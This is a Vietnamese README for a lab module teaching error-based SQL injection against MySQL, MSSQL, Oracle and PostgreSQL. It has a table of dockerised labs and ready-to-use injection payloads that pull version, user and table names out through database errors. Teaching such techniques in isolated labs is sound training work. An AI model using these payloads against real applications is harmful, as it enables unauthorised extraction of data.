# Module 2: Error-based SQL Injection

## 🎯 Mục Tiêu Module

Học cách khai thác SQL Injection thông qua **error messages** của database. Đây là kỹ thuật powerful vì data được extract trực tiếp trong error response.

## 📚 Kiến Thức Yêu Cầu

- Đã hoàn thành Module 1 (Detection & Fingerprinting)
- Hiểu cơ bản về SQL queries
- Biết cách sử dụng Burp Suite/Developer Tools

## 🔬 Labs Trong Module

| Lab ID                      | Technique                 | DBMS       | Scenario              | Độ Khó     |
| --------------------------- | ------------------------- | ---------- | --------------------- | ---------- |
| [SQLi-009](./SQLi-009/)     | EXTRACTVALUE()            | MySQL      | Product detail page   | ⭐ Dễ      |
| [SQLi-010](./SQLi-010/)     | UPDATEXML()               | MySQL      | User profile endpoint | ⭐⭐ TB    |
| [SQLi-011](./SQLi-011/)     | Double Query (FLOOR+RAND) | MySQL      | Blog article          | ⭐⭐⭐ Khó |
| [SQLi-012](./SQLi-012/)     | CONVERT/CAST              | MSSQL      | Corporate directory   | ⭐ Dễ      |
| [SQLi-013](./SQLi-013/)     | XML PATH                  | MSSQL      | Employee lookup API   | ⭐⭐ TB    |
| [SQLi-014](./SQLi-014/)     | UTL_INADDR                | Oracle     | Customer portal       | ⭐⭐ TB    |
| [SQLi-015](./SQLi-015/)     | CTXSYS.DRITHSX.SN         | Oracle     | Report generator      | ⭐⭐⭐ Khó |
| ~~[SQLi-016](./SQLi-016/)~~ | ~~XMLType~~               | ~~Oracle~~ | ~~Data export~~       | ❌ **LỖI** |
| [SQLi-017](./SQLi-017/)     | CAST to numeric           | PostgreSQL | Search filter         | ⭐ Dễ      |
| [SQLi-018](./SQLi-018/)     | CHR() concatenation       | PostgreSQL | Analytics dashboard   | ⭐⭐ TB    |

## 📖 Lý Thuyết Cốt Lõi

### Error-based SQLi là gì?

Error-based SQLi extract data thông qua việc trigger database errors có chứa thông tin nhạy cảm.

### MySQL Error Functions

```sql
-- EXTRACTVALUE (MySQL 5.1+)
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--

-- UPDATEXML (MySQL 5.1+)
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--

-- Double Query
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

### MSSQL Error Functions

```sql
-- CONVERT/CAST
' AND 1=CONVERT(int,@@version)--
' AND 1=CAST((SELECT TOP 1 name FROM sysdatabases) AS int)--

-- XML PATH (multiple rows)
' AND 1=CAST((SELECT name+',' FROM master..sysdatabases FOR XML PATH('')) AS int)--
```

### Oracle Error Functions

```sql
-- UTL_INADDR
' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))--

-- XMLType
' AND (SELECT XMLTYPE('<:'||(SELECT user FROM dual)||'>') FROM dual) IS NOT NULL--
```

### PostgreSQL Error Functions

```sql
-- CAST to numeric
' AND 1=CAST(version() AS numeric)--
' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS numeric)--
```

## 🚀 Cách Chạy Labs

```bash
cd SQLi-XXX
docker-compose up -d
# Truy cập theo README của từng lab
docker-compose down -v
```

## ✅ Checklist Hoàn Thành

- [ ] SQLi-009: MySQL EXTRACTVALUE()
- [ ] SQLi-010: MySQL UPDATEXML()
- [ ] SQLi-011: MySQL Double Query
- [ ] SQLi-012: MSSQL CONVERT/CAST
- [ ] SQLi-013: MSSQL XML PATH
- [ ] SQLi-014: Oracle UTL_INADDR
- [ ] SQLi-015: Oracle CTXSYS.DRITHSX.SN
- [ ] ~~SQLi-016: Oracle XMLType~~ ❌ **LỖI - Oracle XE thiếu message files**
- [ ] SQLi-017: PostgreSQL CAST
- [ ] SQLi-018: PostgreSQL CHR()

## 📚 Tài Liệu Tham Khảo

- [Knowledge Base - Error-based SQLi](../../../_knowledge_base/Web/SQLi/02-error-based.md)
